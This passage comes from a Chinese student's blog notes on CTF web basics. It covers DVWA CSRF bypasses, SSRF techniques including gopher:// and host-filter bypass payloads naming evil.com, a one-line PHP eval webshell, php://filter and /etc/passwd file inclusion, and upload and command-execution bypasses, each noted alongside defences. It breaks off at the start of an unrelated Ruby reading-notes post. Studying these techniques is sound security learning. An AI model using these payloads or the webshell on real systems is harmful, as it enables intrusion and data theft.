    &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Change&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Change&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到, 两者的区别就是, POST方法构造了一个表单然后发送出去了. “实际”的应用中, 
可以利用XSS, 构造一个组件, 然后就可以让无知的用户去上当了. (但是这个太弱了, 
会被防范的方法给拦下来的)&lt;/p&gt;

&lt;h3 id=&quot;referer的防范的绕过---mediun&quot;&gt;Referer的防范的绕过 - mediun&lt;/h3&gt;
&lt;p&gt;和安全等级为low的相比, 主要是多了这样的一个判断, 
就是判断了前一个网站的来源url是否是来自自己网站.&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;stripos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'HTTP_REFERER'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SERVER_NAME'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;绕过的方式就是只要让自己的网址url里面包含原来的网站地址(假如是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;)就好, 比如: 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://website.com/attack_code?query=127.0.0.1&lt;/code&gt;, 就是做了一个假查询, (没用的查询), 
但是让url带上了骗人用的网站地址.&lt;/p&gt;

&lt;p&gt;(学长告诉我们要注意, 网上有一种虽然可行但是很迷幻的操作, 
就是利用软件手动修改&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Referer&lt;/code&gt;的头, 虽然可行, 但是一半不是用户中招的方法, 
所以实际上来说, 不太合理. )&lt;/p&gt;

&lt;h3 id=&quot;token的防范的绕过---high&quot;&gt;Token的防范的绕过 - high&lt;/h3&gt;
&lt;p&gt;防范方法的思路: 服务器这里产生一个token口令, 让游览器每次的请求都带上token来证明自己, 
防止被假货或者是假操作给骗了.&lt;/p&gt;

&lt;p&gt;记一下这个的简单思路: 首先是利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iframe&lt;/code&gt;开一个
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://127.0.0.1/dvwa/vulnerabilities/csrf/&lt;/code&gt;的网页, 
然后利用js命令读取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iframe&lt;/code&gt;里面网页的token信息, 最后生成GET的请求.&lt;/p&gt;

&lt;p&gt;(里面有个点要注意, 就是读取token信息的时候需要一个延时, 
否则就会因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iframe&lt;/code&gt;里面的网页还没有加载完而读取失败. 
还有一点就是要做到把网页该隐藏的东西隐藏一下, 显示一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iframe&lt;/code&gt;出来其实挺尴尬的, 
用户还怎么上当啊. &lt;del&gt;肯定是要显示一个一刀999的广告啊&lt;/del&gt;)&lt;/p&gt;

&lt;p&gt;但是这个做法会有一个坑, 就是延时函数需要同源才能使用, 所以会有问题, 
于是就想到另外一个做法, 在dvwa的Stored XSS里面写入代码不就好了, 
然后每次只需要诱导用户访问那个网站就可以了.&lt;/p&gt;

&lt;p&gt;(要注意的点就是, high模式下的XSS需要通过一个字符编码的绕过)&lt;/p&gt;

&lt;h2 id=&quot;ssrf&quot;&gt;SSRF&lt;/h2&gt;
&lt;p&gt;Server-side request forgery服务端请求伪造, 这回是在url上做手脚了, 
一般这种漏洞会出现在网页上可以处理用户提交的url资源的时候发生的.&lt;/p&gt;

&lt;p&gt;(比如markdown编辑器会处理在线的图片url, 如果传了一个做了手脚的url进去, 
就会导致服务器错误的处理url, 显示一些不得了的东西. )&lt;/p&gt;

&lt;p&gt;这个漏洞的利用是根据服务器用来发起请求的组件的种类的不同来决定的. 
因为不同的组件对url可能有不同的解读方式, 所以首先就要知道发送请求的是什么组件.&lt;/p&gt;

&lt;h3 id=&quot;确定组件&quot;&gt;确定组件&lt;/h3&gt;
&lt;p&gt;一般的方式是让client发送一个请求给自己的VPS, 然后再服务器上面监听请求, 
查看User-Agent的字段来判断.&lt;/p&gt;

&lt;p&gt;(实在没有的可以用&lt;a href=&quot;https://webhook.site&quot;&gt;webhook&lt;/a&gt;提供的服务. )&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;组件类型&lt;/th&gt;
      &lt;th&gt;User-Agent 返回的(大概)形式&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;curl/7.47.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;python &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;urlopen&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Python-urllib/3.6&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;php &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;默认没有任何UA, 采用HTTP/1.1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;php &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_get_contents&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;默认没有任何UA, 采用HTTP/1.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;java &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.netnURL&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;默认返回java的版本信息, 如Java/1.8.0_271&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;headless游览器driver&lt;/td&gt;
      &lt;td&gt;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.82 Safari/537.36&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;针对特定组件的攻击&quot;&gt;针对特定组件的攻击&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; 的情况
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file://&lt;/code&gt; 可以读取本地文件&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gopher://&lt;/code&gt;可以发送一个可控的TCP数据包&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;python &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;urlopen&lt;/code&gt; 的情况
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file://&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;对于两个历史漏洞
        &lt;ul&gt;
          &lt;li&gt;CVE-2019-9948 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local_file://&lt;/code&gt;&lt;/li&gt;
          &lt;li&gt;CVE-2019-9740 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;urlopen&lt;/code&gt; 存在CRLF漏洞, 可以通过注入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\r\n&lt;/code&gt;的换行符控制HTTP请求
(不太了解)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;php &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_get_contents&lt;/code&gt; 的情况
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file://&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;compress.zip://&lt;/code&gt; 留存本地的临时文件 (不太了解)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;java &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.netnURL&lt;/code&gt; 的情况
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file://&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;低版本(jdk1.6, jdk1.7)支持&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gopher://&lt;/code&gt; (但是现在一般没了)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;headless 游览器 (不太了解)
    &lt;ul&gt;
      &lt;li&gt;游览器因为同源策略限制没发读取本地文件(除非chrome采用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-disable-web-security&lt;/code&gt;启动)&lt;/li&gt;
      &lt;li&gt;0day, 1day攻击游览器本身&lt;/li&gt;
      &lt;li&gt;探测内网
        &lt;ul&gt;
          &lt;li&gt;WebRTC, &lt;a href=&quot;https://github.com/SkyLined/LocalNetworkScanner/&quot;&gt;常见工具&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;chrome-error探测端口, &lt;a href=&quot;https://portswigger.net/research/exposing-intranets-with-reliable-browser-based-port-scanning&quot;&gt;介绍文章&lt;/a&gt; 
(虽然没仔细看过, 目前看不懂. )&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;关于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gopher://&lt;/code&gt;的写法, 常见的类型是这样的: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gopher://host/_tcpPackage&lt;/code&gt;, 
其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpPackage&lt;/code&gt;就是一个TCP包的内容, 用的是url编码, 里面有一个坑的地方就是, 
在发送TCP包的时候, 也就是请求的数据的时候, 里面的换行符要写成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\r\n&lt;/code&gt;的形式, 
不然会出现500错误.  &lt;br /&gt;
举一个TCP包的例子:&lt;/p&gt;
  &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET / HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
  &lt;p&gt;再来一个POST方法的例子:&lt;/p&gt;
  &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST / HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
  &lt;p&gt;(上面的例子是用BurpSuite生成的, 这个软件现在还不是很会, 所以以后再努力学. )&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;防御和绕过&quot;&gt;防御和绕过&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;简单的防御方式:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;限制url的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scheme&lt;/code&gt;, 即协议类型, 限制为只允许&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt;或&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;限制url的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;host&lt;/code&gt;ip, 写一个黑名单, 禁止某些内网ip的访问  &lt;br /&gt;
(更狠的是只允许一个白名单, 这样就会更稳, 虽然很难说好不好用. )&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;绕过防御的方式:&lt;/strong&gt;  &lt;br /&gt;
主要是绕过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;host&lt;/code&gt;的方法:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;进制变换, 但是会被php的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip2long&lt;/code&gt;方法给拦下来&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[::]&lt;/code&gt;等于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost&lt;/code&gt;, 跳过限制&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.1&lt;/code&gt;等于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;, 可以绕过&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;利用url解析和请求的函数实现的不同导致的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;host&lt;/code&gt;的绕过, 
&lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&quot;&gt;&lt;del&gt;猫猫&lt;/del&gt;参考&lt;/a&gt;, 下面是一些简单的例子:&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;playload&lt;/th&gt;
          &lt;th&gt;url解析函数&lt;/th&gt;
          &lt;th&gt;url请求函数&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://google.com#@evil.com/&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_url&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readfile&lt;/code&gt;&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://foo@evil.com:80@google.com/&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nodejs&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby&lt;/code&gt;&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo@[evil.com]@yolo.com:3306&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_url&lt;/code&gt;&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;302跳转 (虽然现在很多都已经禁止302跳转了)&lt;/li&gt;
  &lt;li&gt;DNS重绑定  &lt;br /&gt;
因为检查url地址只发生一次, 而DNS重绑定的思路就是第一次检查是否是一个内网地址, 
这个时候解析到外网ip, 通过检查; 第二次真实请求时, 重新发起DNS请求, 
解析到内网ip成功攻击. (难点在于如何满足两次的解析)&lt;/li&gt;
  &lt;li&gt;tls SSRF (没仔细看过, 先记下)  &lt;br /&gt;
将https的请求转换为类似&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gopher&lt;/code&gt;协议的可控TCP请求. 
&lt;a href=&quot;https://blog.zeddyu.info/2021/04/20/tls-poison/&quot;&gt;参考&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;杂项&quot;&gt;杂项&lt;/h3&gt;
&lt;p&gt;学长说某些东西接触多了之后就会有经验了, 比如说常见的php的网页的储存位置:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;一般的存放位置
file://host/var/www/html/index.php
或者也可以用一个技巧来得到位置
file://host/proc/self/cwd/index.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;针对php的一句话木马, 一般的思考就是利用下面讲的PHP的攻击, 写入类似于这样的木马:&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;input&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;达到攻击的目的.&lt;/p&gt;

&lt;h2 id=&quot;针对php的攻击&quot;&gt;针对PHP的攻击&lt;/h2&gt;
&lt;h3 id=&quot;文件包含&quot;&gt;文件包含&lt;/h3&gt;
&lt;p&gt;只要php源代码中有包含用户指定的文件名的代码的时候, 如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include($_GET['filename'])&lt;/code&gt;, 
这样就有可能产生文件包含漏洞. 于是就可以读取文件, 执行任意php代码等.&lt;/p&gt;

&lt;p&gt;文件读取的一个利用:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include('etc/passwd')&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php://filter&lt;/code&gt;将原始读取的文件通过过滤器, 进行字符串转换操作, 可以用来绕过
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include('php://filter/read=convert.base64-encode/resource=/index.php');&lt;/code&gt;  &lt;br /&gt;
这样就可以将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;的内容用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt;编码加密后输出, 
而不是直接被当成php代码执行.&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;convert.iconv&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;input-encoding&amp;gt;.&amp;lt;output-encoding&amp;gt;&lt;/code&gt;等过滤器&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;convert.iconv&lt;/code&gt;的&lt;a href=&quot;https://tttang.com/archive/1395/&quot;&gt;高级操作&lt;/a&gt; (不是很理解)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php://input&lt;/code&gt;接受&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http post&lt;/code&gt;的内容&lt;/li&gt;
  &lt;li&gt;利用文件的上传产生一个临时文件, 最后执行临时文件写入命令&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;文件上传&quot;&gt;文件上传&lt;/h3&gt;
&lt;p&gt;有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_put_contents&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fwrite&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;move_uploaded_file&lt;/code&gt;方法的函数, 和写文件有关.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;防御手段&lt;/th&gt;
      &lt;th&gt;绕过手段&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Post表单里面的Content-Type验证&lt;/td&gt;
      &lt;td&gt;这个是用户可以自己瞎改的, 所以也很少用了&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;列一个后缀名的黑名单, 比如禁止上传&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt;后缀&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php/.&lt;/code&gt; php bug &lt;br /&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.jpg/.php&lt;/code&gt; 服务器解析漏洞 IIS&amp;amp;Nginx&lt;br /&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.jpg%00.php&lt;/code&gt; 服务器解析漏洞 Nginx&lt;br /&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php.rar&lt;/code&gt; Apache解析漏洞, 因为没有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rar&lt;/code&gt;的handler&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;命令执行&quot;&gt;命令执行&lt;/h3&gt;
&lt;p&gt;有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell_exec()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proc_open()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passthru&lt;/code&gt;的命令时, 
有可能会出现命令执行的问题.&lt;/p&gt;

&lt;p&gt;防御手段有php的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escapeshellarg&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escapeshellcmd&lt;/code&gt;的字符串处理, 
(就是把要命的字符转义掉), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disable_functions&lt;/code&gt;选项.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escapeshellcmd&lt;/code&gt;绕过的方法, 
&lt;a href=&quot;https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#argument-injection&quot;&gt;参考&lt;/a&gt;
(不得不说, 有人整理真是好)&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disable_functions&lt;/code&gt;的绕过: 
(因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disable_functions&lt;/code&gt;的原理就像是把函数的名字从环境里面删掉, 
而不是在内存里面删除函数, 所以只是找不到, 而不是不能用. )&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;调用系统函数来执行命令&lt;/li&gt;
  &lt;li&gt;fastcgi交互修改php配置项, 进行拓展执行命令&lt;/li&gt;
  &lt;li&gt;内存破坏的漏洞攻击&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(网络上的一个&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass&quot;&gt;整理&lt;/a&gt;)&lt;/p&gt;

&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;
&lt;p&gt;感觉越写越潦草了, 估计要多试一试才能懂.&lt;/p&gt;

&lt;p&gt;就先这样. :p&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><summary type="html">CTF: Web基础 一个学长的博客, 相比之下, 我的博客只能说是乱七八糟的合集了, 笑. 目前还是慢慢学, 至少现在有了一个好的参考的地方了.</summary></entry><entry><title type="html">Ruby : Understanding Computation</title><link href="http://0.0.0.0:4000/ruby/understanding-computation/" rel="alternate" type="text/html" title="Ruby : Understanding Computation" /><published>2022-01-13T03:12:50+00:00</published><updated>2022-01-13T03:12:50+00:00</updated><id>http://0.0.0.0:4000/ruby/understanding-computation</id><content type="html" xml:base="http://0.0.0.0:4000/ruby/understanding-computation/">&lt;h1 id=&quot;计算的本质--读书记录&quot;&gt;计算的本质 – 读书记录&lt;/h1&gt;
&lt;p&gt;因为SICP太难了, 所以从这本简单一点的书开始看看, 顺带对应明年的计科导第一单元. 
算是预习吧? 是吧?&lt;/p&gt;

&lt;p&gt;注: 我这里面的所有的文字并不都是原书中摘录的, 大部分都是自己瞎写的. 
(甚至没有任何的修改, 都是直接写出来的, 估计错误也一大堆)看的话就图一乐吧.&lt;/p&gt;

&lt;h2 id=&quot;简单的ruby基础&quot;&gt;简单的ruby基础&lt;/h2&gt;
&lt;p&gt;记录一下自己之前没有太注意的点就行了.&lt;/p&gt;

&lt;h3 id=&quot;proc&quot;&gt;proc&lt;/h3&gt;
&lt;p&gt;将函数(方法)看作数据对象来看的思想.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# 一种简单的proc的写法&lt;/span&gt;
